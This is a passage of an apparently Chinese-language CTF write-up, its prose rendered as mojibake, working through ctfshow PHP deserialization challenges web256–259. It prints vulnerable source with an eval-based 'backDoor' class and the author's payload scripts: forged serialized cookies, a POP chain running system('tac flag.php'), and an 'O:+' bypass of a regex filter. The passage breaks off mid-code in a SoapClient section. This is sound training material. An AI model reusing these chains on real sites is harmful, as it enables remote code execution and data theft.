class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username!==<span class="variable language_">$this</span>-&gt;password)&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">              &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>â€‹è¿™ä¸ªé¢˜åœ¨è¿™ä¸ªå‡½æ•°é‡Œæœ‰ä¸ªé—®é¢˜ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username!==<span class="variable language_">$this</span>-&gt;password)&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">              &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>â€‹è¿™é‡Œå¾ˆæ˜æ˜¾ï¼Œå½“è´¦å·å’Œå¯†ç ç›¸ç­‰çš„æ—¶å€™ï¼Œå°±ä¸ä¼šè¾“å‡º flagï¼Œå½“ä¸ç­‰çš„æ—¶å€™å°±è¾“å‡ºï¼Œæ‰€ä»¥ï¼Œéœ€è¦é€šè¿‡ååºåˆ—åŒ–å°† username æˆ–è€… password æ”¹ä¸€ä¸ªï¼Œä½¿ä»–ä»¬ä¸ç›¸ç­‰ï¼Œä¹‹å get ä¼ å‚çš„æ—¶å€™ä¼ å…¥ä¿®æ”¹ä¹‹åçš„å°±è¡Œäº†ã€‚ç”Ÿæˆ cookie çš„è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;isVip = <span class="literal">true</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;password = <span class="string">&quot;xxxxx&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?username=xxxxxx&amp;password=xxxxx</span><br></pre></td></tr></table></figure><h1 id="web257"><a class="markdownIt-Anchor" href="#web257">#</a> web257ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">info</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹è¿™ä¸ªé¢˜ç¬¬ä¸€æ¬¡é‡åˆ°äº†é­”æœ¯æ–¹æ³•ï¼Œ ç”±äºå­˜åœ¨ backDoor ç±»ï¼Œé‡Œé¢æœ‰å¯ä»¥è¿›è¡Œ RCE çš„ç‚¹ï¼Œæ‰€ä»¥ï¼Œè¿™é‡Œå¯ä»¥æƒ³åŠæ³•è§¦å‘ <code>__construct</code>  æ–¹æ³•ä»¥åŠä¿®æ”¹å‚æ•°æ¥åˆ›å»ºè¿™ä¸ªç±»ï¼Œä½†æ˜¯ï¼Œç”±äº info ç±»å’Œ backDoor ç±»éƒ½æœ‰ä¸€ä¸ªåŒåçš„æ–¹æ³•ï¼Œå°±æ˜¯ getInfoï¼Œæ‰€ä»¥åœ¨è„šæœ¬ç»“æŸçš„æ—¶å€™ï¼Œä¹Ÿå°±æ˜¯é‡Šæ”¾æˆ–è€…é”€æ¯ç±»çš„æ—¶å€™å°±ä¼šè°ƒç”¨ <code>__destruct</code>  æ–¹æ³•ï¼Œ ç„¶åè°ƒç”¨åˆ° backDoor ç±»é‡Œçš„ getInfo æ–¹æ³•è¿›è¡Œ RCEã€‚ç”Ÿæˆ payload çš„è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$isVip</span> = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span> = <span class="title">new</span> <span class="title">backDoor</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">info</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span> = <span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$code</span> = <span class="string">&quot;system(&#x27;tac flag.php&#x27;);&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web258"><a class="markdownIt-Anchor" href="#web258">#</a> web258ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">info</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹è¿™ä¸ªé¢˜å¯¹æ¯”ä¸Šä¸€é¢˜ï¼Œå¤šäº†ä¸ªæ­£åˆ™è¿‡æ»¤ï¼ŒåŸºæœ¬ä¸Šå°±æ˜¯è¿‡æ»¤äº† o: æ•°å­— ä»¥åŠ c: æ•°å­— ï¼Œè¿™ç§å½¢å¼ï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨åŠ å·ç»•è¿‡ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span> = <span class="title">new</span> <span class="title">backDoor</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span> = <span class="string">&quot;system(&#x27;tac fl*&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;O:&quot;</span>,<span class="string">&quot;O:+&quot;</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure><p>â€‹è¿™ä¸ªæ„é€ æˆ‘è¸©äº†ä¸å°‘å‘ï¼Œæœ€ä¸¥é‡çš„æ˜¯ system å‡½æ•°åé¢ï¼Œæ²¡æœ‰åŠ åˆ†å·ï¼Œè¿™ä¸ªæ˜¯æœ€å¤§çš„é—®é¢˜ï¼Œæˆ‘ä¸€ç›´ä»¥ä¸ºæ²¡æœ‰æˆåŠŸï¼Œç»“æœæ˜¯å› ä¸ºæ¯å®¶åˆ†å·ã€‚</p><h1 id="web259"><a class="markdownIt-Anchor" href="#web259">#</a> web259ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$vip</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;vip&#x27;</span>]);</span><br><span class="line"><span class="comment">//vip can get flag one key</span></span><br><span class="line"><span class="variable">$vip</span>-&gt;<span class="title function_ invoke__">getFlag</span>();</span><br></pre></td></tr></table></figure><p>â€‹è¿™ä¸ªé¢˜ç»™çš„ä¿¡æ¯å¥½å°‘ï¼Œä¸ä¼šåšï¼Œçœ‹ä¸‹ wpã€‚</p><p>â€‹è¿™ä¸€é¢˜ä¸»è¦è€ƒå¯Ÿäº†åŸç”Ÿç±»çš„ååºåˆ—åŒ–ï¼Œå¥½å§ï¼Œç¬¬ä¸€æ¬¡é‡åˆ°å®Œå…¨æƒ³ä¸åˆ°ï¼Œå³ä½¿å­¦äº†åŸç”Ÿç±»ä¹Ÿæ²¡æƒ³åˆ°ã€‚</p><p>â€‹ç”±äºæ•´ä¸ª index é‡Œé¢æ²¡æœ‰ä»»ä½•ç±»ï¼Œæ‰€ä»¥åé¢çš„ååºåˆ—åŒ–åŠ ä¸Š $vip-&gt;getFlag (); ç»™äººç¬¬ä¸€ååº”åº”è¯¥æ˜¯è°ƒç”¨äº†ä¸€ä¸ªä¸å­˜åœ¨çš„æ–¹æ³•ä»¥åŠåŸç”Ÿç±»ç»“åˆï¼Œè§¦å‘ <code>__call</code>  é­”æœ¯æ–¹æ³•ï¼Œ</p><p>â€‹è´´ä¸€ä¸ªé“¾æ¥ï¼Œè¿™ä¸ªæ–‡ç« æ„Ÿè§‰å¾ˆè¯¦ç»†ï¼š<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1l1cHBpZTAwMS9hcnRpY2xlL2RldGFpbHMvMTM5ODY1NTA1P29wc19yZXF1ZXN0X21pc2M9JTI1N0IlMjUyMnJlcXVlc3QlMjU1RmlkJTI1MjIlMjUzQSUyNTIyOEZGNkI0MEItMkJDMS00MjAxLTg3MTgtMUQyMzE4MUEwRDY0JTI1MjIlMjUyQyUyNTIyc2NtJTI1MjIlMjUzQSUyNTIyMjAxNDA3MTMuMTMwMTAyMzM0Li4lMjUyMiUyNTdEJmFtcDtyZXF1ZXN0X2lkPThGRjZCNDBCLTJCQzEtNDIwMS04NzE4LTFEMjMxODFBMEQ2NCZhbXA7Yml6X2lkPTAmYW1wO3V0bV9tZWRpdW09ZGlzdHJpYnV0ZS5wY19zZWFyY2hfcmVzdWx0Lm5vbmUtdGFzay1ibG9nLTJ+YWxsfnNvYmFpZHVlbmR+ZGVmYXVsdC0yLTEzOTg2NTUwNS1udWxsLW51bGwuMTQyJTVFdjEwMCU1RXBjX3NlYXJjaF9yZXN1bHRfYmFzZTYmYW1wO3V0bV90ZXJtPVNvYXBDbGllbnQlRTUlOEUlOUYlRTclOTQlOUYlRTclQjElQkImYW1wO3NwbT0xMDE4LjIyMjYuMzAwMS40MTg3">ã€é¶åœºã€‘ctfshow è¯¦è§£ web259 åŸç”Ÿç±»ååºåˆ—åŒ–</span></p><p>â€‹è¿™é‡Œæ˜¯ä½¿ç”¨çš„ Soapclient åŸç”Ÿç±»ï¼š</p><blockquote><p><strong>Soapclient åŸç”Ÿç±»ä¸»è¦ä½œç”¨æ˜¯ä½¿ PHP åº”ç”¨ç¨‹åºèƒ½å¤Ÿæ–¹ä¾¿åœ°è°ƒç”¨è¿œç¨‹çš„ SOAP æœåŠ¡</strong></p><p><strong>SoapClient åŸç”Ÿç±»ï¼Œç±»ä¼¼äº curl ä¸€æ ·çš„å­˜åœ¨ï¼ŒåŸºäº XML çš„åè®®ï¼Œå®ƒä½¿åº”ç”¨ç¨‹åºé€šè¿‡ HTTP æ¥äº¤æ¢ä¿¡æ¯</strong></p></blockquote><p>â€‹æç¤ºé‡Œç»™äº†è¿™ä¸ªï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 